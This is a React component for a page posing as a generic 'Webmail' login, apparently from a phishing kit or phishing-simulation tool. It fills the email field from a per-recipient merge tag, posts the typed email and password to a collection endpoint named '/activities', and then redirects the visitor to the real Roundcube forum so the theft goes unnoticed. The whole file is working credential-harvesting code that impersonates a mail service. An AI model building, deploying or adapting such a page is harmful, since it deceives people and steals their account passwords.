import React, {useState } from 'react';
import image from '../Assets/Webmail.png'
import lock from '../Assets/lock-solid-full.png'
import env from '../Assets/envelope-regular-full.png'
import '../App.css'

function Webmail() {
    const [formData, setFormData] = useState({
        email: '',
        password: ''
    });

    const replaceMergeTag = (text, data) => {
        return text.replace(/\[\[\s*-(.*?)\s*-\]\]/g, (_, key) => {
            return data[key.trim()] ?? '';
        });
    };


    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
    
        try {
            const response = await fetch('http://localhost:3120/activities', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                },
                body: JSON.stringify(formData),
            });
    
            const result = await response.json();
    
            if (response.ok) {
                window.location.href = 'https://www.roundcubeforum.net/'; 

            } else {
                alert(`Login failed: ${result.error || 'Unknown error'}`);
            }
    
        } catch (error) {
            console.error('API error:', error);
            alert('Failed to connect to server.');
        }
    };
    

    return (
        <div className='form'>

            <img src={image} alt='' />

            <h1>Welcome to Webmail</h1>

        <form onSubmit={handleSubmit}>

            <div className='formData'>
                <label>Email Address:</label>
                <br /> <br />
                <div className='input'>
                <img src={env} alt='' style={{width: "20px"}}/>
                <input
                    type="email"
                    name="email"
                    placeholder='[[-Email-]]'
                    value={replaceMergeTag('[[-email-]]', formData)}
                    onChange={handleChange}
                    
                    required
                />
                </div>
                   <br /> <br />
            </div>

            <div className='formdata'>
                <label>Password:</label>
                <br /> <br />
                <div className='input'>
                <img src={lock} alt='' style={{width: "20px"}}/>
                <input
                    type="password"
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                    required
                    
                />
                </div>
                   <br /> <br />
            </div>

            <button type="submit">Login</button>
        </form>
        </div>
    );
}

export default Webmail;
